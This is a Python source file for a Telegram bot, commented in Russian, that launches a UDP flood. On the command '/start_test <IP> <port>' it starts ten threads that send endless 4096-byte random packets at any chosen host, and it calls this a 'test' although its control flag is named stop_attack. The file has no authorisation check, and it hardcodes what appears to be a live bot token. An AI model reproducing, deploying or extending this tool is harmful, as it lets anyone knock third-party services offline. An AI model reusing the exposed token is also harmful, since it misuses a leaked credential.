import socket
import random
import threading
import time
from telegram import Update
from telegram.ext import Updater, CommandHandler, CallbackContext

# Telegram Bot token
TELEGRAM_TOKEN = "7876025147:AAHaGOLsjaiKFxKOVjdyRYP-GbfD83kfPXA"  # Замените на ваш токен от BotFather

# Глобальные переменные для управления атакой
stop_attack = False
packet_count = 0
threads = []


# Функция для отправки пакетов
def send_packets(target_ip, target_port):
    global packet_count, stop_attack
    bytes = random._urandom(4096)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while not stop_attack:
        try:
            sock.sendto(bytes, (target_ip, int(target_port)))
            packet_count += 1
        except Exception as e:
            break


# Команда для запуска теста
def start_test(update: Update, context: CallbackContext):
    global stop_attack, packet_count, threads
    stop_attack = False
    packet_count = 0
    threads = []

    # Проверка и получение IP и порта из команды
    try:
        target_ip = context.args[0]
        target_port = context.args[1]
        update.message.reply_text(f"Запускаю тест на {target_ip}:{target_port}...")

        # Запуск потоков для тестирования
        for _ in range(10):  # Количество потоков, можно изменить
            thread = threading.Thread(target=send_packets, args=(target_ip, target_port))
            thread.start()
            threads.append(thread)

        update.message.reply_text("Тест начался. Используйте /stop_test для остановки.")
    except IndexError:
        update.message.reply_text("Ошибка: Укажите IP и порт. Пример: /start_test <IP> <порт>")


# Команда для остановки теста
def stop_test(update: Update, context: CallbackContext):
    global stop_attack, threads
    stop_attack = True  # Устанавливаем флаг для остановки потоков

    # Ждем завершения всех потоков
    for thread in threads:
        thread.join()

    update.message.reply_text(f"Тест завершен. Отправлено пакетов: {packet_count}")


# Команда /start для приветствия
def start(update: Update, context: CallbackContext):
    update.message.reply_text(
        "Привет! Используйте /start_test <IP> <порт> для начала теста и /stop_test для его остановки.")


# Основная функция для запуска бота
def main():
    updater = Updater(TELEGRAM_TOKEN)
    dispatcher = updater.dispatcher

    # Обработчики команд
    dispatcher.add_handler(CommandHandler("start", start))
    dispatcher.add_handler(CommandHandler("start_test", start_test))
    dispatcher.add_handler(CommandHandler("stop_test", stop_test))

    # Запуск бота
    updater.start_polling()
    updater.idle()


if __name__ == "__main__":
    main()
